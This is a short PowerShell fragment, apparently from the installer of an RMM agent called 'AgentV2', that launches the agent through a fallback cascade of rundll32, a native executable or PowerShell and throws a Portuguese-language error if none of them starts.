$cascadeMode = if ($HostMode -in @('Rundll32', 'Native', 'PowerShell')) { $HostMode } else { 'Auto' }
$nativeExe = Join-Path $DataDir 'RmmCore.Host.exe'
$rundllDll = Join-Path $DataDir 'RmmCore.Rundll.dll'

$result = Start-HostCascade -Dir $DataDir -NativeExe $nativeExe -RundllDll $rundllDll `
    -RunnerPath $runnerPath -Mode $cascadeMode

if (-not $result.Ok) {
    throw 'AgentV2 user install falhou: cache Explorer / rundll32 / Host.exe / run-v2 nenhum ficou activo.'
}
